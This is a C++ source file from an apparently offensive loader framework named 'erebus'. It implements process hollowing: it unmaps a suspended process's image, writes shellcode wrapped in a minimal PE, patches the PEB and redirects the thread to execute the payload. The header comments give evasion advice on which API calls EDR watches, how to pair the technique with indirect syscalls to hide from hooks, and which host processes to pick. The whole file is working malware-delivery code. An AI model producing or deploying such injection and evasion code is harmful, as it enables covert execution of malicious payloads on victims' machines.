// Process Hollowing (T1055.012) - CONFIG_INJECTION_TYPE == 10
//
// OPSEC profile:
//   Creates a suspended target process, unmaps its original image, and maps a
//   minimal PE wrapping the shellcode at the vacated image base. PEB.ImageBaseAddress
//   is patched to the new base so the loader view of the process looks intact.
//   The thread's entry point is redirected to the shellcode before resuming.
//
//   High-signal API sequence:
//     NtQueryInformationProcess (ProcessBasicInformation) - EDR watches this pair
//     NtUnmapViewOfSection on PEB.ImageBaseAddress         - very high signal alone
//     NtAllocateVirtualMemory + NtWriteVirtualMemory       - standard remote write
//     NtWriteVirtualMemory to PEB + SetThreadContext       - context hijack
//
//   Pair with indirect syscalls (CONFIG_SYSCALL_BACKEND 0, TartarusGate) to reduce
//   hook visibility. Target binary bitness must match shellcode (x64 only here).
//
// MALLEABLE: CONFIG_TARGET_PROCESS controls the host binary; svchost.exe requires
//   SeTcbPrivilege when starting from a non-system context - use notepad.exe or
//   RuntimeBroker.exe for unprivileged scenarios.

#include "../../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 10

    // ============================================================
    // Minimal PE builder - identical layout to TxfHollow's ghost PE.
    // Wraps raw shellcode in a valid IMAGE_NT_HEADERS64 structure so
    // the allocation can be queried as a mapped image by scanners.
    // ============================================================

    static constexpr DWORD PH_HDR_OFFSET   = 0x40;
    static constexpr DWORD PH_RAW_OFFSET   = 0x400;
    static constexpr DWORD PH_TEXT_RVA     = 0x1000;
    static constexpr DWORD PH_IMAGE_SIZE   = 0x2000;  // header page + .text page

    static void _BuildHollowPE(BYTE* buf, SIZE_T buf_size, const BYTE* sc, SIZE_T sc_size)
    {
        RtlZeroMemory(buf, buf_size);

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buf;
        dos->e_magic  = IMAGE_DOS_SIGNATURE;
        dos->e_lfanew = PH_HDR_OFFSET;

        PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(buf + PH_HDR_OFFSET);
        nt->Signature                        = IMAGE_NT_SIGNATURE;
        nt->FileHeader.Machine               = IMAGE_FILE_MACHINE_AMD64;
        nt->FileHeader.NumberOfSections      = 1;
        nt->FileHeader.SizeOfOptionalHeader  = sizeof(IMAGE_OPTIONAL_HEADER64);
        nt->FileHeader.Characteristics       = IMAGE_FILE_EXECUTABLE_IMAGE
                                             | IMAGE_FILE_LARGE_ADDRESS_AWARE;

        PIMAGE_OPTIONAL_HEADER64 opt = &nt->OptionalHeader;
        opt->Magic                  = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
        opt->AddressOfEntryPoint    = PH_TEXT_RVA;
        opt->ImageBase              = 0x140000000ULL;
        opt->SectionAlignment       = 0x1000;
        opt->FileAlignment          = 0x200;
        opt->MajorSubsystemVersion  = 6;
        opt->MinorSubsystemVersion  = 0;
        opt->SizeOfImage            = PH_IMAGE_SIZE;
        opt->SizeOfHeaders          = PH_RAW_OFFSET;
        opt->Subsystem              = IMAGE_SUBSYSTEM_WINDOWS_GUI;
        opt->DllCharacteristics     = IMAGE_DLLCHARACTERISTICS_NX_COMPAT
                                    | IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
        opt->NumberOfRvaAndSizes    = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;

        PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);
        RtlCopyMemory(sect->Name, ".text\0\0\0", 8);
        sect->Misc.VirtualSize      = (DWORD)sc_size;
        sect->VirtualAddress        = PH_TEXT_RVA;
        sect->SizeOfRawData         = (DWORD)((sc_size + 0x1FFu) & ~0x1FFu);
        sect->PointerToRawData      = PH_RAW_OFFSET;
        sect->Characteristics       = IMAGE_SCN_CNT_CODE
                                    | IMAGE_SCN_MEM_EXECUTE
                                    | IMAGE_SCN_MEM_READ;

        if (PH_RAW_OFFSET + sc_size <= buf_size)
            RtlCopyMemory(buf + PH_RAW_OFFSET, sc, sc_size);
    }

    VOID InjectionProcessHollow(IN BYTE* shellcode, IN SIZE_T shellcode_size,
                                IN HANDLE process_handle, IN HANDLE thread_handle)
    {
        LOG_INFO("Injection via Process Hollowing (T1055.012)");

        HMODULE ntdll = ImportModule("ntdll.dll");
        if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }

        ImportFunction(ntdll, NtQueryInformationProcess, typeNtQueryInformationProcess);
        ImportFunction(ntdll, NtReadVirtualMemory,       typeNtReadVirtualMemory);
        ImportFunction(ntdll, NtUnmapViewOfSection,      typeNtUnmapViewOfSection);
        ImportFunction(ntdll, NtAllocateVirtualMemory,   typeNtAllocateVirtualMemory);
        ImportFunction(ntdll, NtWriteVirtualMemory,      typeNtWriteVirtualMemory);
        ImportFunction(ntdll, NtProtectVirtualMemory,    typeNtProtectVirtualMemory);
        ImportFunction(ntdll, NtResumeThread,            typeNtResumeThread);
        ImportFunction(ntdll, NtClose,                   typeNtClose);

        if (!NtQueryInformationProcess || !NtReadVirtualMemory || !NtUnmapViewOfSection ||
            !NtAllocateVirtualMemory   || !NtWriteVirtualMemory || !NtProtectVirtualMemory ||
            !NtResumeThread            || !NtClose)
        {
            LOG_ERROR("Failed to resolve one or more NT functions");
            return;
        }

        // Step 1: Get the remote process PEB base via ProcessBasicInformation.
        PROCESS_BASIC_INFORMATION pbi = {};
        ULONG pbi_len = 0;
        NTSTATUS status = NtQueryInformationProcess(
            process_handle,
            (PROCESSINFOCLASS)0,  // ProcessBasicInformation
            &pbi,
            sizeof(pbi),
            &pbi_len
        );
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtQueryInformationProcess failed (NTSTATUS: 0x%08X)", status);
            return;
        }
        LOG_INFO("Remote PEB base: 0x%p", pbi.PebBaseAddress);

        // Step 2: Read PEB.ImageBaseAddress (offset 0x10 on x64).
        PVOID remote_image_base = NULL;
        SIZE_T bytes_read = 0;
        BYTE* peb_image_field = (BYTE*)pbi.PebBaseAddress + 0x10;
        status = NtReadVirtualMemory(
            process_handle,
            peb_image_field,
            &remote_image_base,
            sizeof(PVOID),
            &bytes_read
        );
        if (!NT_SUCCESS(status) || !remote_image_base) {
            LOG_ERROR("NtReadVirtualMemory (PEB.ImageBase) failed (NTSTATUS: 0x%08X)", status);
            return;
        }
        LOG_INFO("Remote image base from PEB: 0x%p", remote_image_base);

        // Step 3: Build the hollow PE wrapping our shellcode.
        SIZE_T pe_size = (SIZE_T)PH_RAW_OFFSET + shellcode_size;
        if (pe_size < PH_IMAGE_SIZE) pe_size = PH_IMAGE_SIZE;
        pe_size = (pe_size + 0x1FFu) & ~(SIZE_T)0x1FFu;

        BYTE* pe_buf = (BYTE*)HeapAlloc(pe_size);
        if (!pe_buf) { LOG_ERROR("HeapAlloc for PE buffer failed"); return; }
        _BuildHollowPE(pe_buf, pe_size, shellcode, shellcode_size);
        LOG_INFO("Hollow PE built (%zu bytes)", pe_size);

        // Step 4: Unmap the original image from the target process.
        // This is the classic hollow step - the target process's image is evicted.
        // High signal: NtUnmapViewOfSection on the PEB image base is well-known.
        status = NtUnmapViewOfSection(process_handle, remote_image_base);
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtUnmapViewOfSection failed (NTSTATUS: 0x%08X)", status);
            erebus::HeapFree(pe_buf);
            return;
        }
        LOG_INFO("Original image unmapped");

        // Step 5: Allocate memory in the target at the vacated base address.
        // Attempt preferred base first; if ASLR or another mapping occupies it
        // the allocation will land elsewhere and relocation fixing is skipped
        // (our minimal PE has no relocations - entry point is at fixed RVA).
        PVOID alloc_base = remote_image_base;
        SIZE_T alloc_size = pe_size;
        status = NtAllocateVirtualMemory(
            process_handle,
            &alloc_base,
            0,
            &alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!NT_SUCCESS(status)) {
            // Fallback: let the OS pick a base address.
            alloc_base = NULL;
            alloc_size = pe_size;
            status = NtAllocateVirtualMemory(
                process_handle,
                &alloc_base,
                0,
                &alloc_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );
            if (!NT_SUCCESS(status)) {
                LOG_ERROR("NtAllocateVirtualMemory failed (NTSTATUS: 0x%08X)", status);
                erebus::HeapFree(pe_buf);
                return;
            }
            LOG_INFO("Preferred base unavailable - allocated at fallback: 0x%p", alloc_base);
        } else {
            LOG_INFO("Allocated at preferred base: 0x%p", alloc_base);
        }

        // Step 6: Write PE headers.
        SIZE_T written = 0;
        status = NtWriteVirtualMemory(
            process_handle,
            alloc_base,
            pe_buf,
            PH_RAW_OFFSET,
            &written
        );
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtWriteVirtualMemory (headers) failed (NTSTATUS: 0x%08X)", status);
            erebus::HeapFree(pe_buf);
            return;
        }

        // Step 7: Write .text section (shellcode) at RVA 0x1000.
        PVOID text_dest = (BYTE*)alloc_base + PH_TEXT_RVA;
        status = NtWriteVirtualMemory(
            process_handle,
            text_dest,
            pe_buf + PH_RAW_OFFSET,
            shellcode_size,
            &written
        );
        erebus::HeapFree(pe_buf);
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtWriteVirtualMemory (.text) failed (NTSTATUS: 0x%08X)", status);
            return;
        }
        LOG_SUCCESS("PE written to target (headers + .text)");

        // Step 8: Flip .text section to PAGE_EXECUTE_READ.
        PVOID protect_base = text_dest;
        SIZE_T protect_size = (shellcode_size + 0xFFFu) & ~(SIZE_T)0xFFFu;
        ULONG old_prot = 0;
        NtProtectVirtualMemory(process_handle, &protect_base, &protect_size,
                               PAGE_EXECUTE_READ, &old_prot);

        // Step 9: Update PEB.ImageBaseAddress to the new allocation.
        // If alloc_base == remote_image_base this is a no-op write, but it
        // also serves as a consistency fix in the fallback case.
        status = NtWriteVirtualMemory(
            process_handle,
            peb_image_field,
            &alloc_base,
            sizeof(PVOID),
            &written
        );
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtWriteVirtualMemory (PEB.ImageBase) failed (NTSTATUS: 0x%08X)", status);
        }
        LOG_INFO("PEB.ImageBaseAddress patched to: 0x%p", alloc_base);

        // Step 10: Redirect the suspended thread's RIP to the shellcode entry point.
        PVOID entry_point = (BYTE*)alloc_base + PH_TEXT_RVA;

        LPCONTEXT ctx = new CONTEXT();
        ctx->ContextFlags = CONTEXT_FULL;

        if (!GetThreadContext(thread_handle, ctx)) {
            LOG_ERROR("GetThreadContext failed (Code: 0x%08lX)", GetLastError());
            delete ctx;
            return;
        }

#ifdef _WIN64
        ctx->Rcx = (DWORD64)entry_point;
        ctx->Rip = (DWORD64)entry_point;
#else
        ctx->Eax = (DWORD)entry_point;
        ctx->Eip = (DWORD)entry_point;
#endif

        if (!SetThreadContext(thread_handle, ctx)) {
            LOG_ERROR("SetThreadContext failed (Code: 0x%08lX)", GetLastError());
            delete ctx;
            return;
        }
        delete ctx;
        LOG_SUCCESS("Thread context redirected to hollowed entry: 0x%p", entry_point);

        // Step 11: Resume the thread.
        status = NtResumeThread(thread_handle, NULL);
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtResumeThread failed (NTSTATUS: 0x%08X)", status);
        } else {
            LOG_SUCCESS("Thread resumed - shellcode executing in hollowed process");
        }

        NtClose(process_handle);
        NtClose(thread_handle);
        LOG_SUCCESS("Injection Complete!");
    }

#endif
} // namespace erebus
